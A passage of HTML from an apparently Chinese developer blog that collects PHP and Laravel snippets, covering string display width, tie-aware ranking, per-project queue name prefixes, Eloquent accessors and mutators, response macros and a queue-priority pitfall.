class="params">$str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ceil((strlen($str) + mb_strlen($str, <span class="string">"UTF8"</span>)) / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_display_len</span> (<span class="params">string $str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z0-9_]/'</span>, $str, $single);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count($single[<span class="number">0</span>]) / <span class="number">2</span> + mb_strlen(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $str));</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//www.php.net/manual/zh/function.mb-strwidth.php</span></span><br></pre></td></tr></table></figure>
<h3 id="bas64简历"><a href="#bas64简历" class="headerlink" title="bas64简历"></a>bas64简历</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/25907</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-排名算法支持重复排名"><a href="#PHP-排名算法支持重复排名" class="headerlink" title="PHP 排名算法支持重复排名"></a>PHP 排名算法支持重复排名</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/26769</span></span><br><span class="line">$arr = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">10</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">2</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">3</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">50</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">'id'</span>=&gt;<span class="number">4</span>,</span><br><span class="line">        <span class="string">'score'</span>=&gt;<span class="number">50</span>,</span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line">你想从小到大，取出前三名，如果第四名和第三名也相同，也取出来</span><br><span class="line"></span><br><span class="line">先按 score 排序</span><br><span class="line"></span><br><span class="line">array_multisort(array_column($arr,<span class="string">'score'</span>),SORT_ASC,$arr);</span><br><span class="line">前三名</span><br><span class="line"></span><br><span class="line"> $results = array_slice($arr, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">true</span>);</span><br><span class="line">然后前三名的最后一名和之后的比较</span><br><span class="line"></span><br><span class="line">$length = count($arr);</span><br><span class="line">$resultLength = count($results);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$resultLength 比 $length小说明$arr 的还有元素，否则它们俩就相等了。然后比较key和key+1的值。</span></span><br><span class="line">极限是所有的人都和第三名相同，自行判断是否需要所有人都胜出，来限制 $resultLength 的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($resultLength&lt;$length &amp;&amp;$results[$resultLength<span class="number">-1</span>][<span class="string">'score'</span>]==$arr[$resultLength][<span class="string">'score'</span>])&#123;</span><br><span class="line">            array_push($results,$arr[$resultLength]);</span><br><span class="line">            $resultLength = count($results);</span><br><span class="line">        &#125;</span><br><span class="line">最后如果要判断某一用户是否胜出</span><br><span class="line"></span><br><span class="line">$ifWinner = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(in_array($id,array_column($results,<span class="string">'id'</span>)))&#123;</span><br><span class="line">       $ifWinner = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多个-Laravel-应用-queue-队列执行时会互串"><a href="#多个-Laravel-应用-queue-队列执行时会互串" class="headerlink" title="多个 Laravel 应用 queue 队列执行时会互串"></a>多个 Laravel 应用 queue 队列执行时会互串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">app/Libriries/helper.php ，可以写在你任何想放的地方</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 多个 laravel 项目，如果 --queue 相同会互串</span></span><br><span class="line"><span class="comment"> * 这里统一加个当前项目名的前缀来区分</span></span><br><span class="line"><span class="comment"> * @param $name</span></span><br><span class="line"><span class="comment"> * @return string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">queue_name</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">    $name_trans = [];</span><br><span class="line">    foreach(explode(<span class="string">','</span>,$name) <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        $name_trans[] = str_slug(config(<span class="string">'app.name'</span>) . <span class="string">' '</span> . $v, <span class="string">'_'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode(<span class="string">','</span>,$name_trans);</span><br><span class="line">&#125;</span><br><span class="line">修改每个 Job 的 $queue 添加 queue_name ()</span><br><span class="line"></span><br><span class="line">namespace App\Jobs;</span><br><span class="line"><span class="comment">// 省略...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApiBehavior</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 添加这一行</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;queue = queue_name(<span class="string">'你的队列名'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 分发队列时，照常分发即可</span></span><br><span class="line">ApiBehavior::dispatch()</span><br><span class="line"><span class="comment">// 或者这种分发时指定，可以省略第二步。</span></span><br><span class="line">ApiBehavior::dispatch()-&gt;onQueue(quque_name(<span class="string">'你的队列名'</span>))</span><br><span class="line">新建监听队列命令，包装一层 quque:work，以使用自定义队列名</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Console\Commands;</span><br><span class="line"></span><br><span class="line">use Illuminate\Console\Command;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueWorkListen</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $signature = <span class="string">'queue:work-listen</span></span><br><span class="line"><span class="string">                            &#123;connection? : The name of the queue connection to work&#125;</span></span><br><span class="line"><span class="string">                            &#123;--queue= : The names of the queues to work&#125;</span></span><br><span class="line"><span class="string">                            &#123;--daemon : Run the worker in daemon mode (Deprecated)&#125;</span></span><br><span class="line"><span class="string">                            &#123;--once : Only process the next job on the queue&#125;</span></span><br><span class="line"><span class="string">                            &#123;--delay=0 : The number of seconds to delay failed jobs&#125;</span></span><br><span class="line"><span class="string">                            &#123;--force : Force the worker to run even in maintenance mode&#125;</span></span><br><span class="line"><span class="string">                            &#123;--memory=128 : The memory limit in megabytes&#125;</span></span><br><span class="line"><span class="string">                            &#123;--sleep=3 : Number of seconds to sleep when no job is available&#125;</span></span><br><span class="line"><span class="string">                            &#123;--timeout=60 : The number of seconds a child process can run&#125;</span></span><br><span class="line"><span class="string">                            &#123;--tries=0 : Number of times to attempt a job before logging it failed&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $description = <span class="string">'Start processing jobs on the queue as a daemon'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new command instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;call(<span class="string">'queue:work'</span>,[</span><br><span class="line">            <span class="string">'connection'</span>=&gt; $<span class="keyword">this</span>-&gt;argument(<span class="string">'connection'</span>),</span><br><span class="line">            <span class="string">'--queue'</span>   =&gt; queue_name($<span class="keyword">this</span>-&gt;option(<span class="string">'queue'</span>) ?: <span class="string">'default'</span>),</span><br><span class="line">            <span class="string">'--daemon'</span>  =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'daemon'</span>),</span><br><span class="line">            <span class="string">'--once'</span>    =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'once'</span>),</span><br><span class="line">            <span class="string">'--delay'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'delay'</span>),</span><br><span class="line">            <span class="string">'--force'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'force'</span>),</span><br><span class="line">            <span class="string">'--memory'</span>  =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'memory'</span>),</span><br><span class="line">            <span class="string">'--sleep'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'sleep'</span>),</span><br><span class="line">            <span class="string">'--timeout'</span> =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'timeout'</span>),</span><br><span class="line">            <span class="string">'--tries'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'tries'</span>),</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5</span>、使用自定义命令监听队列，其他参数与 queue:work 一样使用https:<span class="comment">//learnku.com/articles/19460</span></span><br><span class="line"></span><br><span class="line">php /<span class="keyword">var</span>/www/ebank/artisan queue:work-listen --queue=email --sleep=<span class="number">3</span></span><br><span class="line"><span class="comment">// or 多个</span></span><br><span class="line">php /<span class="keyword">var</span>/www/ebank/artisan queue:work-listen --queue=email,test,test2,test3 --sleep=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">redis配置不同库就可以</span><br></pre></td></tr></table></figure>
<h3 id="修改器"><a href="#修改器" class="headerlink" title="修改器"></a>修改器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Models;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line">use Carbon\Carbon;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $table = <span class="string">'baby'</span>;</span><br><span class="line">    protected $appends = [<span class="string">'age'</span>];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getAgeAttribute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $date = <span class="keyword">new</span> Carbon($<span class="keyword">this</span>-&gt;birthday);</span><br><span class="line">        <span class="keyword">return</span> Carbon::now()-&gt;diffInYears($date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这个代码比较简单，就是通过已有属性 birthday，计算 Baby 几岁了，得到 age 属性。</span><br><span class="line"></span><br><span class="line">前端就可以直接拿到结果：https:<span class="comment">//learnku.com/articles/21982#topnav</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $baby-&gt;age;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更改为日期类型的属性</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $dates = [</span><br><span class="line">        <span class="string">'created_at'</span>, </span><br><span class="line">        <span class="string">'updated_at'</span>, </span><br><span class="line">        <span class="string">'expires_at'</span>, </span><br><span class="line">        <span class="string">'gets_mad_at'</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 我们检索时始终将名字大写</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getFirstNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ucfirst($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 我们检索时始终将姓氏大写</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getLastNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ucfirst($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将名称保存到数据库时，始终将名字大写</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">setFirstNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;attributes[<span class="string">'first_name'</span>] = ucfirst($value);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将名称保存到数据库时，始终将姓氏大写</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">setLastNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;attributes[<span class="string">'last_name'</span>] = ucfirst($value);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 我们将密码保存至数据库时，总是哈希后保存。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            public <span class="function"><span class="keyword">function</span> <span class="title">setPasswordAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;attributes[<span class="string">'password'</span>] = Hash::make($value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 总是 json_decode settings字段，所以它们是可用的</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                public <span class="function"><span class="keyword">function</span> <span class="title">getSettingsAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> json_decode($value);</span><br><span class="line">            </span><br><span class="line">                    <span class="comment">// 你可以确保同时返回一个数组</span></span><br><span class="line">                    <span class="comment">// return json_decode($value, true);</span></span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                * 保存到数据库时，总是对 settings 字段进行 json_encode</span></span><br><span class="line"><span class="comment">                 * Always json_encode the settings when saving to the database</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                public <span class="function"><span class="keyword">function</span> <span class="title">setSettingsAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                    $<span class="keyword">this</span>-&gt;attributes[<span class="string">'settings'</span>] = json_encode($value);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取 awesomedudette 用户  https://learnku.com/laravel/t/27551</span></span><br><span class="line">$user = App\User::where(<span class="string">'username'</span>, <span class="string">'awesomedudette'</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找此用户的过期时间前一小时</span></span><br><span class="line">$explodeWarning = $user-&gt;explodes_at-&gt;subHour();</span><br><span class="line">$user = App\User::create([</span><br><span class="line">    <span class="string">'first_name'</span>  =&gt; <span class="string">'chris'</span>,</span><br><span class="line">    <span class="string">'last_name'</span>   =&gt; <span class="string">'sevilleja'</span>,</span><br><span class="line">    <span class="string">'email'</span>       =&gt; <span class="string">'chris&amp;64;scotch.io'</span>,</span><br><span class="line">    <span class="string">'password'</span>    =&gt; <span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'expires_at'</span>  =&gt; Carbon::now()-&gt;addMonth(),</span><br><span class="line">    <span class="string">'explodes_at'</span> =&gt; Carbon::now()-&gt;addDay(),</span><br><span class="line">    <span class="string">'gets_mad_at'</span> =&gt; Carbon::yesterday()</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<h3 id="响应宏原理"><a href="#响应宏原理" class="headerlink" title="响应宏原理"></a>响应宏原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Response::macro(<span class="string">'success'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$data = [], $message = <span class="string">'success'</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JsonResponse([</span><br><span class="line">        <span class="string">'code'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'data'</span> =&gt; $data,</span><br><span class="line">        <span class="string">'message'</span> =&gt; $message</span><br><span class="line">    ], <span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">接下来， 你可以再任何地方使用它response()。https:<span class="comment">//godruoyi.com/posts/laravel-response-macro-principle</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//UserController.php</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params">UserRepository $userRepository</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> response()-&gt;success($userRepository-&gt;all(), <span class="string">'success'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注意，你只能通过response()这个全局方法或是app(<span class="string">'Illuminate\Routing\ResponseFactory'</span>)来使用它</span><br><span class="line"></span><br><span class="line">response()-&gt;success();<span class="comment">//OK</span></span><br><span class="line">app(<span class="string">'Illuminate\Routing\ResponseFactory'</span>)-&gt;success();<span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Response Facade</span></span><br><span class="line">Response::success();<span class="comment">//ok</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> \Illuminate\Http\Response)-&gt;success();<span class="comment">//Error</span></span><br><span class="line">每一次请求结束，PHP 的变量都会 unset，Laravel 的 singleton 只是在某一次请求过程中的singleton；你在 Laravel 中的静态变量也不能在多个请求之间共享，因为每一次请求结束都会 unset。理解这些概念，是写高质量代码的第一步，也是最关键的一步。因此记住，PHP是一种脚本语言，所有的变量只会在这一次请求中生效，下次请求之时已被重置，而不像Java静态变量拥有全局作用。</span><br></pre></td></tr></table></figure>
<h3 id="队列优先级的一个坑"><a href="#队列优先级的一个坑" class="headerlink" title="队列优先级的一个坑"></a>队列优先级的一个坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">php artisan queue:work --queue=high,low</span><br><span class="line">这样，当我们的任务需要优先发送时，就可以通过指定队列名high来优先发送。</span><br><span class="line"></span><br><span class="line">dispatch((<span class="keyword">new</span> Job)-&gt;onQueue(<span class="string">'high'</span>));</span><br><span class="line">但是当你后续任务没有指定队列名（high、low）时，你的队列任务永远也不会执行。（比如我们在发送消息通知时）</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Notifications;</span><br><span class="line"></span><br><span class="line">use Illuminate\Bus\Queueable;</span><br><span class="line">use Illuminate\Notifications\Notification;</span><br><span class="line">use Illuminate\Contracts\Queue\ShouldQueue;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YourNotification</span> <span class="keyword">extends</span> <span class="title">Notification</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Queueable;</span><br><span class="line">&#125;</span><br><span class="line">你发现即使你按照文档说的，implements ShouldQueue并且use Queueable，该通知还是无法加入队列。</span><br><span class="line"></span><br><span class="line">那是因为config\queuq.php配置中，指定了默认的队列名为<span class="keyword">default</span>，所以所有的队列任务，如果没指定队列名时，默认是<span class="keyword">default</span>。</span><br><span class="line"></span><br><span class="line">但是我们在启动队列进程时，只指定了high和low。当然不会生效。https:<span class="comment">//godruoyi.com/posts/a-pit-in-the-laravel-queue-priority</span></span><br><span class="line"></span><br><span class="line">解决办法： <span class="number">1</span>、修改config\queuq.php默认队列名为low或high <span class="number">2</span>、启动队列进程时添加<span class="keyword">default</span>（--queue=high,<span class="keyword">default</span>,low）</span><br></pre></td></tr></table></figure>
<h3 id="合成图片"><a href="#合成图片" class="headerlink" title="合成图片"></a>合成图片</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use Intervention\Image\ImageManager;</span><br><span class="line"></span><br><span class="line">$manager = <span class="keyword">new</span> ImageManager(array(<span class="string">'driver'</span> =&gt; <span 